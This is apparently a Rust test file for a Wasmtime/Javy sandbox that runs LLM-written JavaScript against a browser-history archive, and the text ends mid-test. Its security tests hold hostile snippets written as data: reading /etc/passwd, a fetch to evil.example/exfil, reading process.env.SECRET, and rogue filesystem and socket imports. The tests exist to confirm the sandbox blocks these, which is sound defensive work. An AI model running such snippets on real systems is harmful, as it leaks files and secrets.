//! Code-mode sandbox tests (W-AI-8 WU-1).
//!
//! Two tiers: PURE-LOGIC tests (parsing/classification/serde, un-gated) and the CONTRACT tests that
//! run the REAL Wasmtime + scoped-WASI runtime — the functional proof that LLM JS executes, plus the
//! security properties (no dangerous authority, the resource limits, cancel, honest errors). The
//! functional + security-property tests run against the REAL committed Javy guest: they ARE the
//! contract, so they must not be stubbed.

use super::*;
use crate::ai::AiRunCancelled;
use crate::archive::{
    create_schema, ensure_archive_initialized, open_archive_connection,
    open_intelligence_connection,
};
use crate::config::project_paths_with_root;
use crate::models::{AppConfig, ArchiveMode};
use crate::utils::now_rfc3339;
use rusqlite::{Connection, params};
use sha2::{Digest, Sha256};
use std::sync::atomic::AtomicBool;

/// A multi-thread tokio runtime: REQUIRED so the host fn's `block_in_place` + `Handle::block_on`
/// is valid (block_in_place panics on a current-thread runtime). Mirrors the worker's runtime.
///
/// Uses 4 worker threads so a `block_in_place` retrieval always leaves spare workers even under
/// the full parallel test sweep (a 2-thread pool can starve when many runtimes contend).
fn runtime() -> tokio::runtime::Runtime {
    tokio::runtime::Builder::new_multi_thread()
        .worker_threads(4)
        .enable_all()
        .build()
        .expect("multi-thread runtime")
}

/// Builds a context over an INITIALIZED but EMPTY archive (no seeded rows): each query_history is
/// a real but fast empty search — used by the budget test so 64 calls finish well inside the
/// wall-time budget even under the full parallel sweep.
fn empty_archive_context() -> (crate::config::ProjectPaths, AgentToolContext) {
    let (paths, context) = empty_context();
    ensure_archive_initialized(&paths, &context.config, None).expect("init archive");
    let archive = open_archive_connection(&paths, &context.config, None).expect("open archive");
    create_schema(&archive).expect("create schema");
    (paths, context)
}

/// A fresh, uniquely-rooted project path so parallel tests never share an archive.
fn test_paths() -> crate::config::ProjectPaths {
    let unique = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("system time")
        .as_nanos();
    let root =
        std::env::temp_dir().join(format!("pathkeep-codemode-{}-{}", std::process::id(), unique));
    std::fs::create_dir_all(&root).expect("create temp root");
    project_paths_with_root(&root)
}

fn base_config() -> AppConfig {
    let mut config = AppConfig {
        initialized: true,
        archive_mode: ArchiveMode::Plaintext,
        git_enabled: false,
        ..AppConfig::default()
    };
    config.ai.enabled = true;
    config.ai.assistant_enabled = true;
    config
}

/// Builds an empty (no archive) context — enough for the security/limit tests, which never need
/// real rows (an empty archive returns zero rows honestly, never an error).
fn empty_context() -> (crate::config::ProjectPaths, AgentToolContext) {
    let paths = test_paths();
    let context = AgentToolContext {
        paths: paths.clone(),
        config: base_config(),
        database_key: None,
        embedding_provider: None,
        default_profile_id: None,
        default_domain: None,
        default_limit: 8,
        // These code_mode tests pass `control` directly to `run_code_in_sandbox`/`execute_guest`,
        // not through the tool context, so the context's own hook stays `None`.
        run_control: None,
    };
    (paths, context)
}

/// Inserts one canonical visit so `search_history_internal` (lexical plane) returns a real row.
fn seed_visit(connection: &Connection, history_id: i64, url: &str, title: &str) {
    let profile_id = "chrome:Default";
    let profile_row_id = 1_i64;
    let visit_ms = 13_300_000_000_000_i64; // a fixed chrome-epoch-ish ms value
    connection
        .execute(
            "INSERT OR IGNORE INTO archive.runs (id, run_type, trigger, started_at, timezone, status, profile_scope_json, warnings_json, stats_json, due_only)
             VALUES (1, 'backup', 'test', ?1, 'UTC', 'success', '[]', '[]', '{}', 0)",
            [now_rfc3339()],
        )
        .expect("seed run");
    connection
        .execute(
            "INSERT OR IGNORE INTO archive.source_profiles (id, browser_kind, browser_version, profile_name, profile_path, discovered_at, enabled, profile_key, updated_at)
             VALUES (?1, 'chrome', 'test', ?2, ?3, ?4, 1, ?2, ?4)",
            params![profile_row_id, profile_id, "/tmp/p", now_rfc3339()],
        )
        .expect("seed profile");
    connection
        .execute(
            "INSERT OR IGNORE INTO archive.urls
             (id, url, title, visit_count, typed_count, first_visit_ms, first_visit_iso, last_visit_ms, last_visit_iso, source_profile_id, created_by_run_id, source_url_id, hidden, payload_hash, recorded_at)
             VALUES (?1, ?2, ?3, 1, 0, ?4, ?5, ?4, ?5, ?6, 1, ?1, 0, ?7, ?5)",
            params![
                history_id,
                url,
                title,
                visit_ms,
                now_rfc3339(),
                profile_row_id,
                format!("payload-{history_id}"),
            ],
        )
        .expect("seed url");
    connection
        .execute(
            "INSERT INTO archive.visits
             (id, url_id, source_visit_id, visit_time_ms, visit_time_iso, transition_type, visit_duration_ms, source_profile_id, created_by_run_id, from_visit, is_known_to_sync, visited_link_id, external_referrer_url, app_id, event_fingerprint, payload_hash, recorded_at)
             VALUES (?1, ?1, ?2, ?3, ?4, 805306368, 0, ?5, 1, NULL, 1, 0, NULL, NULL, ?6, ?7, ?4)",
            params![
                history_id,
                history_id.to_string(),
                visit_ms,
                now_rfc3339(),
                profile_row_id,
                format!("fp-{history_id}"),
                format!("payload-{history_id}"),
            ],
        )
        .expect("seed visit");
}

/// Builds a context over a seeded archive with two real visits (for host-API correctness).
///
/// The canonical schema is created on the archive DB, then visits are seeded through the
/// INTELLIGENCE connection (which ATTACHes the archive as `archive`), exactly as the existing AI
/// tests do — this is the connection shape `search_history_internal` reads through.
fn seeded_context() -> (crate::config::ProjectPaths, AgentToolContext) {
    let (paths, context) = empty_context();
    ensure_archive_initialized(&paths, &context.config, None).expect("init archive");
    let archive = open_archive_connection(&paths, &context.config, None).expect("open archive");
    create_schema(&archive).expect("create schema");
    let intelligence =
        open_intelligence_connection(&paths, &context.config, None).expect("open intelligence");
    seed_visit(&intelligence, 101, "https://www.rust-lang.org/learn", "Learn Rust");
    seed_visit(&intelligence, 102, "https://tauri.app/start", "Tauri Start");
    (paths, context)
}

/// Cancel control whose `cancelled()` is driven by an `AtomicBool` the test flips.
struct FlagControl(Arc<AtomicBool>);
impl AiRunControl for FlagControl {
    fn checkpoint(&self, detail: &str) -> Result<()> {
        if self.0.load(Ordering::Relaxed) {
            return Err(AiRunCancelled::new(detail).into());
        }
        Ok(())
    }
    fn cancelled(&self) -> bool {
        self.0.load(Ordering::Relaxed)
    }
}

fn sha256_hex(bytes: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    hex::encode(hasher.finalize())
}

/// Sets the per-thread wall-time budget override for the lifetime of the returned guard, so a
/// budget/host-call test that must complete many real retrievals is not racing the production 5s
/// clock under the instrumented parallel coverage sweep. Restores the previous value on drop.
struct WallTimeBudgetGuard(Option<Duration>);
impl WallTimeBudgetGuard {
    fn set(budget: Duration) -> Self {
        let previous = TEST_WALL_TIME_BUDGET.with(|cell| cell.replace(Some(budget)));
        Self(previous)
    }
}
impl Drop for WallTimeBudgetGuard {
    fn drop(&mut self) {
        TEST_WALL_TIME_BUDGET.with(|cell| cell.set(self.0));
    }
}

// ---- Pure logic (un-gated; the contract tests below run the REAL runtime) --------------------

#[test]
fn guest_sha256_matches_pin() {
    // The committed guest's hash must equal the pin; a guest rebuild without updating the pin (or a
    // tampered guest) fails here. On mismatch the assert message prints the digest to paste in.
    let digest = sha256_hex(GUEST_WASM);
    assert_eq!(
        digest, GUEST_WASM_SHA256,
        "harness.wasm changed; update GUEST_WASM_SHA256 to: {digest}"
    );
}

#[test]
fn search_plane_parsing_defaults_to_hybrid() {
    assert_eq!(CodeSearchPlane::parse(Some("bm25")), CodeSearchPlane::Bm25);
    assert_eq!(CodeSearchPlane::parse(Some("KEYWORD")), CodeSearchPlane::Bm25);
    assert_eq!(CodeSearchPlane::parse(Some("lexical")), CodeSearchPlane::Bm25);
    assert_eq!(CodeSearchPlane::parse(Some("vector")), CodeSearchPlane::Vector);
    assert_eq!(CodeSearchPlane::parse(Some("semantic")), CodeSearchPlane::Vector);
    assert_eq!(CodeSearchPlane::parse(Some("hybrid")), CodeSearchPlane::Hybrid);
    assert_eq!(CodeSearchPlane::parse(Some("garbage")), CodeSearchPlane::Hybrid);
    assert_eq!(CodeSearchPlane::parse(None), CodeSearchPlane::Hybrid);
    // `as_token` yields the stable lowercase spelling the structured host-call record + the FE key on
    // (never the Rust enum Debug), and it round-trips back through `parse` for every plane.
    for plane in [CodeSearchPlane::Bm25, CodeSearchPlane::Vector, CodeSearchPlane::Hybrid] {
        assert_eq!(CodeSearchPlane::parse(Some(plane.as_token())), plane);
    }
    assert_eq!(CodeSearchPlane::Bm25.as_token(), "bm25");
    assert_eq!(CodeSearchPlane::Vector.as_token(), "vector");
    assert_eq!(CodeSearchPlane::Hybrid.as_token(), "hybrid");
}

#[test]
fn char_boundary_floor_never_splits_a_codepoint() {
    // The C-2 truncation helper, unit-tested across every branch:
    // 中 = E4 B8 AD (3 bytes), 😀 = F0 9F 98 80 (4 bytes).
    let s = "中😀".as_bytes(); // [E4 B8 AD][F0 9F 98 80], len 7
    // cap at/past the end → the end is already a boundary (no walk-back).
    assert_eq!(char_boundary_floor(s, s.len()), s.len());
    assert_eq!(char_boundary_floor(s, 100), s.len(), "cap > len clamps to len");
    // cap on a real boundary (between 中 and 😀) → unchanged.
    assert_eq!(char_boundary_floor(s, 3), 3);
    // cap INSIDE the 3-byte 中 → walks back to 0.
    assert_eq!(char_boundary_floor(s, 1), 0);
    assert_eq!(char_boundary_floor(s, 2), 0);
    // cap INSIDE the 4-byte 😀 → walks back to its start (3).
    assert_eq!(char_boundary_floor(s, 4), 3);
    assert_eq!(char_boundary_floor(s, 5), 3);
    assert_eq!(char_boundary_floor(s, 6), 3);
    // cap 0 is always a boundary (the end == 0 guard).
    assert_eq!(char_boundary_floor(s, 0), 0);
    // an all-ASCII buffer is a boundary at every index.
    assert_eq!(char_boundary_floor(b"abcd", 2), 2);
}

#[test]
fn classify_trap_maps_known_limits_and_passes_through_faults() {
    // Precise Trap-variant classification (not string matching).
    assert_eq!(classify_trap(&wasmtime::Trap::Interrupt.into()), Some(LimitsHit::Time));
    assert_eq!(classify_trap(&wasmtime::Trap::OutOfFuel.into()), Some(LimitsHit::Time));
    assert_eq!(classify_trap(&wasmtime::Trap::MemoryOutOfBounds.into()), Some(LimitsHit::Memory));
    // A genuine guest fault is NOT a limit → None (the outcome carries an honest error).
    assert_eq!(classify_trap(&wasmtime::Trap::UnreachableCodeReached.into()), None);
    // A non-Trap error is also a fault, not a limit.
    assert_eq!(classify_trap(&anyhow::anyhow!("some host error")), None);
}

#[test]
fn limits_hit_and_records_serialize_camel_case() {
    // The outcome crosses to the FE/journal, so its serde shape is part of the WU-4/5 contract.
    let json = serde_json::to_string(&LimitsHit::HostCalls).unwrap();
    assert_eq!(json, "\"host-calls\"");
    // A `query_history` record carries the STRUCTURED args (query/plane/limit) the WU-5 FE localizes,
    // plus the non-localized `argsSummary` debug fallback — all camelCase on the wire.
    let record = HostCallRecord {
        function: "query_history".to_string(),
        query: Some("x".to_string()),
        plane: Some("bm25".to_string()),
        limit: Some(10),
        requested_ids: None,
        args_summary: "query=\"x\" plane=bm25 limit=10".to_string(),
        row_count: 3,
    };
    let value = serde_json::to_value(&record).unwrap();
    assert_eq!(value["function"], "query_history");
    assert_eq!(value["query"], "x");
    assert_eq!(value["plane"], "bm25");
    assert_eq!(value["limit"], 10);
    assert_eq!(value["argsSummary"], "query=\"x\" plane=bm25 limit=10");
    assert_eq!(value["rowCount"], 3);
    // The fetch_visits-only field is omitted for a query_history record (per-function `skip`).
    assert!(value.get("requestedIds").is_none(), "requestedIds omitted for query_history: {value}");

    // A `fetch_visits` record carries `requestedIds` and omits the query_history-only fields.
    let fetch = HostCallRecord {
        function: "fetch_visits".to_string(),
        query: None,
        plane: None,
        limit: None,
        requested_ids: Some(2),
        args_summary: "ids=2 (capped at 50)".to_string(),
        row_count: 1,
    };
    let fetch_value = serde_json::to_value(&fetch).unwrap();
    assert_eq!(fetch_value["function"], "fetch_visits");
    assert_eq!(fetch_value["requestedIds"], 2);
    assert!(fetch_value.get("query").is_none(), "query omitted for fetch_visits: {fetch_value}");
    assert!(fetch_value.get("plane").is_none(), "plane omitted for fetch_visits: {fetch_value}");
    assert!(fetch_value.get("limit").is_none(), "limit omitted for fetch_visits: {fetch_value}");
}

// ---- Functional CONTRACT — real LLM JS runs through the REAL Javy guest -----------------------

#[test]
fn real_js_calls_query_history_and_returns_distilled_json_with_citations() {
    // THE must-have: real LLM-style JS calls query_history(bm25), aggregates the rows in JS (loop +
    // object), and returns a distilled value — over a seeded fixture archive. The distilled JSON is
    // correct and the canonical_url citations are preserved (the W-STAR contract).
    let (_paths, context) = seeded_context();
    let source = r#"
        const a = query_history({ query: "rust", plane: "bm25", limit: 10 });
        const byDomain = {};
        for (const r of a.rows) byDomain[r.domain] = (byDomain[r.domain] || 0) + 1;
        return { topDomains: byDomain, count: a.rows.length, firstUrl: a.rows[0].canonicalUrl };
    "#;
    let rt = runtime();
    let outcome = run_code_in_sandbox(source, &context, rt.handle().clone(), None);

    assert!(outcome.error.is_none(), "clean run, got error: {:?}", outcome.error);
    assert_eq!(outcome.limits_hit, None);
    assert_eq!(outcome.host_calls.len(), 1, "exactly one query_history call");
    let record = &outcome.host_calls[0];
    assert_eq!(record.function, "query_history");
    // The structured args reflect the EFFECTIVE (parsed/clamped) call the WU-5 FE localizes.
    assert_eq!(record.query.as_deref(), Some("rust"));
    assert_eq!(record.plane.as_deref(), Some("bm25"));
    assert_eq!(record.limit, Some(10));
    assert_eq!(record.requested_ids, None, "requested_ids is fetch_visits-only");
    assert!(record.args_summary.contains("plane=bm25"), "debug fallback: {}", record.args_summary);

    // The distilled JSON the model sees: a real JS aggregation over the seeded row.
    let distilled: Value = serde_json::from_str(&outcome.model_text).expect("valid JSON output");
    assert_eq!(distilled["count"], 1, "one seeded rust page matched");
    assert_eq!(distilled["topDomains"]["www.rust-lang.org"], 1);
    let expected_canonical =
        crate::visit_taxonomy::normalize_visit_url("https://www.rust-lang.org/learn")
            .map(|n| n.canonical_url);
    assert_eq!(distilled["firstUrl"].as_str(), expected_canonical.as_deref());

    // The citation is carried out-of-band with its canonical_url (so the answer stays starrable).
    let cited = outcome.citations.iter().find(|c| c.history_id == 101).expect("rust page cited");
    assert_eq!(cited.canonical_url, expected_canonical);
}

#[test]
fn real_js_multi_query_fan_out_with_join_and_dedup() {
    // A multi-query fan-out: the JS issues two query_history calls and does a JS join/dedup, then
    // returns the distilled set. Proves the synchronous host-call channel works across many calls.
    let (_paths, context) = seeded_context();
    let source = r#"
        const q1 = query_history({ query: "rust", plane: "bm25" });
        const q2 = query_history({ query: "tauri", plane: "bm25" });
        const seen = {};
        const ids = [];
        for (const r of [...q1.rows, ...q2.rows]) {
            if (!seen[r.id]) { seen[r.id] = true; ids.push(r.id); }
        }
        return { ids: ids.sort((a, b) => a - b), queries: 2 };
    "#;
    let rt = runtime();
    let outcome = run_code_in_sandbox(source, &context, rt.handle().clone(), None);

    assert!(outcome.error.is_none(), "clean run, got error: {:?}", outcome.error);
    assert_eq!(outcome.host_calls.len(), 2, "two query_history calls");
    let distilled: Value = serde_json::from_str(&outcome.model_text).expect("valid JSON output");
    assert_eq!(distilled["queries"], 2);
    // Both seeded ids (101 rust, 102 tauri) are present, deduped.
    let ids: Vec<i64> =
        distilled["ids"].as_array().unwrap().iter().map(|v| v.as_i64().unwrap()).collect();
    assert!(ids.contains(&101), "rust id present: {ids:?}");
    assert!(ids.contains(&102), "tauri id present: {ids:?}");
}

#[test]
fn real_js_uses_normal_language_features_without_any_host_call() {
    // The source can use ordinary JS — loops, objects, JSON, Math — and return a value with no host
    // call at all (code-mode is a general distillation surface, not only a query relay).
    let (_paths, context) = empty_context();
    let source = r#"
        const squares = [1, 2, 3, 4].map(x => x * x);
        const sum = squares.reduce((a, b) => a + b, 0);
        const blob = JSON.parse('{"k": 42}');
        return { squares, sum, sqrt: Math.sqrt(sum), k: blob.k };
    "#;
    let rt = runtime();
    let outcome = run_code_in_sandbox(source, &context, rt.handle().clone(), None);
    assert!(outcome.error.is_none(), "got error: {:?}", outcome.error);
    assert!(outcome.host_calls.is_empty(), "no host call expected");
    let distilled: Value = serde_json::from_str(&outcome.model_text).expect("valid JSON");
    assert_eq!(distilled["sum"], 30);
    assert_eq!(distilled["sqrt"], 5.477225575051661);
    assert_eq!(distilled["k"], 42);
    assert_eq!(distilled["squares"], json!([1, 4, 9, 16]));
}

#[test]
fn fetch_visits_resolves_requested_ids_only() {
    // fetch_visits over a seeded archive returns the requested visible visit ids and drops unknown
    // ones (honest, bounded, read model only) — driven by real JS calling the fetch_visits global.
    let (_paths, context) = seeded_context();
    let source = r#"
        const r = fetch_visits([101, 999999]);
        return { rowIds: r.rows.map(x => x.id) };
    "#;
    let rt = runtime();
    let outcome = run_code_in_sandbox(source, &context, rt.handle().clone(), None);
    assert!(outcome.error.is_none(), "got error: {:?}", outcome.error);
    assert_eq!(outcome.host_calls.len(), 1);
    let record = &outcome.host_calls[0];
    assert_eq!(record.function, "fetch_visits");
    // The structured args carry the requested-id COUNT (2 ids asked for); the query_history-only
    // fields stay None so the WU-5 FE renders only this function's args.
    assert_eq!(record.requested_ids, Some(2));
    assert_eq!(record.query, None);
    assert_eq!(record.plane, None);
    assert_eq!(record.limit, None);
    assert!(record.args_summary.contains("ids=2"), "debug fallback: {}", record.args_summary);
    assert!(outcome.citations.iter().any(|c| c.history_id == 101));
    assert!(!outcome.citations.iter().any(|c| c.history_id == 999999));
    let distilled: Value = serde_json::from_str(&outcome.model_text).expect("valid JSON");
    assert_eq!(distilled["rowIds"], json!([101]));
}

// ---- Security CONTRACT — run against the REAL committed Javy guest + scoped WASI --------------

#[test]
fn the_committed_guest_imports_only_scoped_wasi_no_dangerous_authority() {
    // THE no-dangerous-authority contract: introspect the committed Javy module's imports and assert
    // EVERY import is one of the scoped `wasi_snapshot_preview1` fns (fd read/write/seek/close/fdstat,
    // clock, environ, exit). There is NO fs (`path_*`), NO socket (`sock_*`), NO `random_get`, and NO
    // non-WASI module — so the guest cannot reach the filesystem, network, env, or real clock.
    let engine = build_engine().expect("engine");
    let module = Module::new(&engine, GUEST_WASM).expect("compile guest");
    assert_no_dangerous_authority(&module).expect("no dangerous authority");
    for import in module.imports() {
        assert_eq!(
            import.module(),
            ALLOWED_IMPORT_MODULE,
            "only wasi_snapshot_preview1 is allowed"
        );
        assert!(ALLOWED_WASI_FNS.contains(&import.name()), "unexpected WASI fn: {}", import.name());
        // Explicitly: no filesystem, socket, or randomness import sneaks in.
        assert!(!import.name().starts_with("path_"), "no fs path import");
        assert!(!import.name().starts_with("sock_"), "no socket import");
        assert_ne!(import.name(), "random_get", "no WASI randomness import");
        assert_ne!(import.name(), "fd_prestat_get", "no preopen enumeration import");
    }
}

#[test]
fn a_guest_that_imports_fs_is_rejected_before_running() {
    // A would-be malicious guest that tries to import a WASI fs fn (`path_open`, the route to the
    // filesystem) is denied by the import gate — it never instantiates.
    let fs_guest = r#"
        (module
          (import "wasi_snapshot_preview1" "path_open"
            (func $path_open (param i32 i32 i32 i32 i32 i64 i64 i32 i32) (result i32)))
          (memory (export "memory") 1)
          (func (export "_start")))
    "#;
    let engine = build_engine().expect("engine");
    let module = Module::new(&engine, fs_guest).expect("compile");
    let denied = assert_no_dangerous_authority(&module).expect_err("fs import must be denied");
    assert!(denied.to_string().contains("dangerous-authority violation"));
}

#[test]
fn a_guest_that_imports_a_non_wasi_module_is_rejected() {
    // A guest importing a non-WASI module (e.g. an attempt to name a custom host fn) is denied: the
    // only import module allowed is wasi_snapshot_preview1.
    let rogue = r#"
        (module
          (import "env" "delete_archive" (func $d))
          (memory (export "memory") 1)
          (func (export "_start")))
    "#;
    let engine = build_engine().expect("engine");
    let module = Module::new(&engine, rogue).expect("compile");
    let denied = assert_no_dangerous_authority(&module).expect_err("non-wasi module denied");
    assert!(denied.to_string().contains("non-WASI module"));
}

#[test]
fn a_guest_that_imports_sockets_is_rejected() {
    // A socket import (the route to the network) is denied before instantiation.
    let sock_guest = r#"
        (module
          (import "wasi_snapshot_preview1" "sock_accept"
            (func $sock_accept (param i32 i32 i32) (result i32)))
          (memory (export "memory") 1)
          (func (export "_start")))
    "#;
    let engine = build_engine().expect("engine");
    let module = Module::new(&engine, sock_guest).expect("compile");
    let denied = assert_no_dangerous_authority(&module).expect_err("socket import denied");
    assert!(denied.to_string().contains("dangerous-authority violation"));
}

#[test]
fn js_using_fs_or_net_globals_fails_safely() {
    // Real JS in the REAL guest that reaches for fs/net globals finds them undefined (QuickJS has no
    // such globals and the guest has no host bridge for them) → an honest CodeOutcome.error, never a
    // host escape or panic. This proves the engine itself exposes no ambient fs/net to user JS.
    let (_paths, context) = empty_context();
    let rt = runtime();
    for snippet in [
        "return require('fs').readFileSync('/etc/passwd');",
        "return fetch('https://evil.example/exfil');",
        "return new XMLHttpRequest();",
        "return process.env.SECRET;",
    ] {
        let outcome = run_code_in_sandbox(snippet, &context, rt.handle().clone(), None);
        assert!(outcome.error.is_some(), "snippet must fail safely: {snippet:?}");
        assert!(outcome.model_text.is_empty(), "no output for a failed snippet: {snippet:?}");
        assert_eq!(outcome.limits_hit, None, "a missing-global is an error, not a limit");
    }
}

#[test]
fn date_now_is_a_fixed_zero_clock_and_math_random_is_deterministic() {
    // The clock/random posture: with the scoped WASI fixed-zero clock, Date.now() reads 0 (no
    // real-time leak), and Math.random() is the QuickJS deterministic PRNG (same value every run, no
    // WASI randomness import). Two runs return identical values — reproducible + minimal authority.
    let (_paths, context) = empty_context();
    let source = "return { now: Date.now(), rand: Math.random() };";
    let rt = runtime();
    let first = run_code_in_sandbox(source, &context, rt.handle().clone(), None);
    let second = run_code_in_sandbox(source, &context, rt.handle().clone(), None);
    assert!(first.error.is_none() && second.error.is_none());
    let a: Value = serde_json::from_str(&first.model_text).expect("json");
    let b: Value = serde_json::from_str(&second.model_text).expect("json");
    assert_eq!(a["now"], 0, "Date.now() reads the fixed zero clock");
    assert_eq!(a, b, "the run is fully deterministic (same Date.now + Math.random)");
}

#[test]
fn infinite_loop_traps_on_the_wall_time_deadline() {
    // An infinite-loop guest must trap on the epoch deadline within the wall-time budget and yield a
    // clean CodeOutcome (Time), never a host hang/panic. A no-import spin module exercises the real
    // engine config (epoch deadline) without needing the JS engine.
    let spin_guest = r#"
        (module
          (memory (export "memory") 2)
          (func (export "_start") (loop $l (br $l))))
    "#;
    let rt = runtime();
    let (_paths, context) = empty_context();
    let outcome = execute_guest(
        spin_guest.as_bytes(),
        "_start",
        "",
        &context,
        rt.handle().clone(),
        None,
        u64::MAX,
    )
    .expect("setup ok");
    assert_eq!(outcome.limits_hit, Some(LimitsHit::Time));
    assert!(outcome.error.is_none(), "a limit trap is not an honest-error case");
}

#[test]
fn fuel_exhaustion_traps_deterministically() {
    // The deterministic CPU variant: with tiny fuel a busy loop runs out of fuel and traps. This is
    // reproducible (no wall-clock dependence) so it pins the CPU-bound behavior precisely.
    let spin_guest = r#"
        (module
          (memory (export "memory") 2)
          (func (export "_start") (loop $l (br $l))))
    "#;
    let rt = runtime();
    let (_paths, context) = empty_context();
    let outcome = execute_guest(
        spin_guest.as_bytes(),
        "_start",
        "",
        &context,
        rt.handle().clone(),
        None,
        10_000,
    )
    .expect("setup ok");
    assert_eq!(outcome.limits_hit, Some(LimitsHit::Time));
}

#[test]
fn infinite_loop_in_real_js_traps_on_the_wall_time_deadline() {
    // The functional security proof: an infinite loop in REAL guest JS trips the wall-time deadline
    // and yields a clean Time outcome (the epoch ticker traps QuickJS mid-eval). A short test budget
    // keeps it fast.
    let _budget = WallTimeBudgetGuard::set(Duration::from_millis(300));
    let (_paths, context) = empty_context();
    let source = "while (true) {} return 1;";
    let rt = runtime();
    let outcome = run_code_in_sandbox(source, &context, rt.handle().clone(), None);
    assert_eq!(outcome.limits_hit, Some(LimitsHit::Time));
    assert!(outcome.error.is_none());
}

#[test]
fn unbounded_allocation_in_real_js_is_bounded_not_a_host_panic_or_hang() {
    // B-1: the production-guest counterpart to the WAT `memory.grow` test below. Drives the REAL
    // committed Javy guest into an allocation storm and proves the storm is BOUNDED — never a host
    // panic/hang, never silent unbounded success.
    //
    // EMPIRICAL (Javy/QuickJS, this build): a JS-level allocation storm does NOT reach the wasm
    // StoreLimits memory cap. QuickJS's OWN allocator refuses the request first and throws a clean
    // JS error ("out of memory" for the array/Uint8Array storms here), which the harness reports via
    // the `error` op → an honest `CodeOutcome.error` with `limits_hit == None` and empty output. The
    // `memory.grow` limiter (→ LimitsHit::Memory) is the OUTER backstop the WAT guest exercises
    // directly; QuickJS simply self-limits below that line. Either way the storm is bounded.
    //
    // So this test asserts the real production contract (a clean bounded JS error, no host panic/hang,
    // no output) rather than forcing a Memory limit the production guest does not actually hit. We
    // outrun the wall clock (30s budget) so the OOM, not the deadline, is what stops the storm.
    let _budget = WallTimeBudgetGuard::set(Duration::from_secs(30));
    let (_paths, context) = empty_context();
    let source = "let a = []; for (;;) { a.push(new Uint8Array(1<<20)); } return a.length;";
    let rt = runtime();
    let outcome = run_code_in_sandbox(source, &context, rt.handle().clone(), None);

    // The storm is bounded: an honest JS OOM error, NOT the wall-time deadline (we outran it), NOT a
    // memory-cap trap (QuickJS self-limits first), and NEVER an unbounded silent success.
    assert_eq!(outcome.limits_hit, None, "QuickJS self-limits below the wasm memory cap");
    assert!(
        outcome.error.as_deref().is_some_and(|e| e.contains("out of memory")),
        "the allocation storm surfaces a clean JS OOM, got: {:?}",
        outcome.error
    );
    assert!(outcome.model_text.is_empty(), "a stormed run produces no distilled output");
}

#[test]
fn unbounded_allocation_traps_on_the_memory_limiter() {
    // A guest that grows memory without bound must trap on the StoreLimits memory cap, not OOM the
    // host. memory.grow returns -1 once the limiter refuses, and this guest then traps via
    // unreachable so the outcome records a Memory limit.
    let grow_guest = r#"
        (module
          (memory (export "memory") 1)
          (func (export "_start")
            (loop $l
              (if (i32.eq (memory.grow (i32.const 100)) (i32.const -1))
                (then (unreachable)))
              (br $l))))
    "#;
    let rt = runtime();
    let (_paths, context) = empty_context();
    let outcome = execute_guest(
        grow_guest.as_bytes(),
        "_start",
        "",
        &context,
        rt.handle().clone(),
        None,
        u64::MAX,
    )
    .expect("setup ok");
    assert_eq!(outcome.limits_hit, Some(LimitsHit::Memory));
}

#[test]
fn host_call_budget_trips_after_the_cap_in_real_js() {
    // Real JS that loops issuing query_history past MAX_HOST_CALLS trips the budget: the host refuses
    // the overflow call (closes the channel → the global throws) and records HostCalls. Exactly
    // MAX_HOST_CALLS retrievals were serviced. An empty archive keeps each call fast + deterministic.
    let _budget = WallTimeBudgetGuard::set(Duration::from_secs(120));
    let (_paths, context) = empty_archive_context();
    let source = r#"
        let i = 0;
        try {
            for (i = 0; i < 1000; i++) { query_history({ query: "x" }); }
        } catch (e) {
            return { serviced: i };
        }
        return { serviced: i };
    "#;
    let rt = runtime();
    let outcome = run_code_in_sandbox(source, &context, rt.handle().clone(), None);
    assert_eq!(outcome.limits_hit, Some(LimitsHit::HostCalls));
    assert_eq!(outcome.host_calls.len() as u32, MAX_HOST_CALLS, "exactly the cap was serviced");
}

#[test]
fn a_huge_output_is_capped_with_a_limit_marker() {
    // Real JS returning more than MAX_OUTPUT_BYTES has its output truncated host-side and the Output
    // limit recorded — the model never receives an unbounded blob.
    let (_paths, context) = empty_context();
    // A string longer than the cap once JSON-encoded.
    let source = "return 'A'.repeat(300000);";
    let rt = runtime();
    let outcome = run_code_in_sandbox(source, &context, rt.handle().clone(), None);
    assert_eq!(outcome.limits_hit, Some(LimitsHit::Output));
    assert_eq!(outcome.model_text.len(), MAX_OUTPUT_BYTES);
}

#[test]
fn a_multibyte_output_is_truncated_on_a_char_boundary() {
    // C-2: real JS returning a multibyte (CJK + emoji) string past MAX_OUTPUT_BYTES is truncated on a
    // UTF-8 char boundary, never mid-codepoint. A raw byte cut would split a 3-byte CJK / 4-byte emoji
    // glyph and leave `model_text` ragged (lossy decode → U+FFFD). The output is capped (Output limit)
    // AND valid UTF-8 ending on a boundary, so it stays `≤` the cap but `>` cap-minus-one-codepoint.
    let (_paths, context) = empty_context();
    // Mix a 3-byte CJK char and a 4-byte emoji so the cut point can fall inside either width; the
    // leading ASCII `x` shifts alignment so MAX_OUTPUT_BYTES lands STRICTLY INSIDE a multibyte glyph
    // (a raw cut here would split it) — this drives the boundary walk-back, not just the equal case.
    // serde_json wraps the string in quotes and leaves these chars as literal UTF-8 bytes.
    let source = "return 'x' + '中文😀'.repeat(40000);";
    let rt = runtime();
    let outcome = run_code_in_sandbox(source, &context, rt.handle().clone(), None);

    assert_eq!(outcome.limits_hit, Some(LimitsHit::Output), "the over-cap output is marked");
    // `model_text` came back through `String::from_utf8_lossy`, so an interior U+FFFD would mean a
    // codepoint was split before decoding. Assert the captured bytes are EXACTLY valid UTF-8 (no
    // replacement char introduced), end on a char boundary, and were cut BELOW the raw cap (proving
    // the walk-back fired — a raw cut would have stopped exactly at the cap mid-codepoint).
    let bytes = outcome.model_text.as_bytes();
    assert!(bytes.len() < MAX_OUTPUT_BYTES, "the walk-back trimmed below the raw byte cap");
    assert!(
        bytes.len() > MAX_OUTPUT_BYTES - 4,
        "truncates as close to the cap as a whole codepoint allows (≤ 3 bytes shy)"
    );
    assert!(std::str::from_utf8(bytes).is_ok(), "the truncated output is valid UTF-8");
    assert!(
        !outcome.model_text.contains('\u{FFFD}'),
        "no U+FFFD replacement char (proves no codepoint was split)"
    );
    // The boundary the host cut on is a real char boundary of the source JSON encoding.
    assert!(
        outcome.model_text.is_char_boundary(outcome.model_text.len()),
        "ends on a UTF-8 char boundary"
    );
}

#[test]
fn cancel_mid_script_traps_and_yields_a_clean_outcome() {
    // A user cancel mid-run bumps the epoch so an otherwise-infinite guest traps promptly, and the
    // outcome reads Cancelled (not Time/error) — a clean CodeOutcome, never a panic.
    let spin_guest = r#"
        (module
          (memory (export "memory") 2)
          (func (export "_start") (loop $l (br $l))))
    "#;
